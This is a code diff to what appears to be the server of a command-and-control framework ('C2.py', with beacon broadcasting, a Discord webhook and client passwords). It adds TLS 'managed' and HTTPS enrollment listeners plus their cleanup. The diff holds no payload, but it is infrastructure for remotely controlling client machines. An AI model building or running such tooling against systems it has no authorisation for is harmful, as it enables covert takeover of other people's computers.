@@ -14,7 +14,17 @@ import json
 from urllib.parse import urlparse, parse_qs
 import sys
 sys.path.insert(0, os.path.dirname(os.path.dirname(os.path.abspath(__file__))))
-from config import DISCORD_WEBHOOK, SERVER_IP, API_KEY as _CONFIG_API_KEY, CLIENT_PASSWORD
+from config import (
+    API_KEY as _CONFIG_API_KEY,
+    CLIENT_PASSWORD,
+    DISCORD_WEBHOOK,
+    ENROLLMENT_PORT,
+    MANAGED_PORT,
+    MANAGED_STORE,
+    MANAGED_TLS_CERT,
+    MANAGED_TLS_KEY,
+    SERVER_IP,
+)
 
 try:
     from .commands import CmdContext, command_registry  # package mode (tests)
@@ -22,12 +32,26 @@ try:
     from .protocol import decode_message, encode_message, recv_exactly
     from .crypto import decrypt, derive_key, encrypt
     from .console import console as _console  # package mode (tests)
+    from .managed_auth import (
+        DeviceRegistry,
+        EnrollmentServer,
+        EnrollmentService,
+        EnrollmentStore,
+        ManagedServer,
+    )
 except ImportError:  # script mode (python C2/C2.py)
     from commands import CmdContext, command_registry
     from auth import check_api_key, check_client_password
     from protocol import decode_message, encode_message, recv_exactly
     from crypto import decrypt, derive_key, encrypt
     from console import console as _console
+    from managed_auth import (
+        DeviceRegistry,
+        EnrollmentServer,
+        EnrollmentService,
+        EnrollmentStore,
+        ManagedServer,
+    )
 
 version = 11.7 #7/3/2026
 
@@ -858,6 +882,10 @@ def interact_with_client(client_manager, client_id):
 
 def main():
     client_manager = ClientManager()
+    managed_stop_event = threading.Event()
+    managed_server = None
+    enrollment_server = None
+    enrollment_thread = None
 
     try:
         from dashboard import start_dashboard
@@ -900,6 +928,60 @@ def main():
     except Exception as e:
         print(f"[!] Failed to setup server: {e}")
         return
+
+    if (
+        MANAGED_TLS_CERT
+        and MANAGED_TLS_KEY
+        and os.path.isfile(MANAGED_TLS_CERT)
+        and os.path.isfile(MANAGED_TLS_KEY)
+    ):
+        try:
+            registry = DeviceRegistry(os.path.join(MANAGED_STORE, "devices.bin"))
+            enrollment_service = EnrollmentService(
+                EnrollmentStore(os.path.join(MANAGED_STORE, "tokens.json")), registry
+            )
+            managed_server = ManagedServer(
+                HOST,
+                MANAGED_PORT,
+                MANAGED_TLS_CERT,
+                MANAGED_TLS_KEY,
+                registry,
+            )
+            enrollment_server = EnrollmentServer(
+                HOST,
+                ENROLLMENT_PORT,
+                MANAGED_TLS_CERT,
+                MANAGED_TLS_KEY,
+                enrollment_service,
+            )
+            threading.Thread(
+                target=managed_server.serve_forever,
+                args=(managed_stop_event,),
+                name="managed-listener",
+                daemon=False,
+            ).start()
+            enrollment_thread = threading.Thread(
+                target=enrollment_server.serve_forever,
+                name="enrollment-listener",
+                daemon=False,
+            )
+            enrollment_thread.start()
+            print(
+                f"[+] Managed TLS on {HOST}:{MANAGED_PORT}; "
+                f"enrollment HTTPS on {HOST}:{ENROLLMENT_PORT}"
+            )
+        except Exception as e:
+            managed_stop_event.set()
+            if managed_server is not None:
+                managed_server.stop(timeout=5)
+            if enrollment_server is not None:
+                enrollment_server.server_close()
+            managed_server = None
+            enrollment_server = None
+            enrollment_thread = None
+            print(f"[!] Managed services failed: {e}")
+    else:
+        print("Managed services disabled")
 
     print(f"\n[+] Listening on {HOST}:{PORT}")
     threading.Thread(target=broadcast_c2_beacon, daemon=True).start()
@@ -1277,6 +1359,25 @@ def main():
     finally:
         # Cleanup
         print("[+] Cleaning up...")
+        managed_stop_event.set()
+        try:
+            if managed_server is not None:
+                managed_server.stop(timeout=5)
+        except Exception as e:
+            print(f"[!] Managed listener cleanup error: {e}")
+        try:
+            if enrollment_server is not None:
+                try:
+                    enrollment_server.shutdown()
+                finally:
+                    enrollment_server.server_close()
+        except Exception as e:
+            print(f"[!] Enrollment listener cleanup error: {e}")
+        try:
+            if enrollment_thread is not None:
+                enrollment_thread.join(timeout=5)
+        except Exception as e:
+            print(f"[!] Enrollment thread cleanup error: {e}")
         try:
             s.close()
         except Exception:
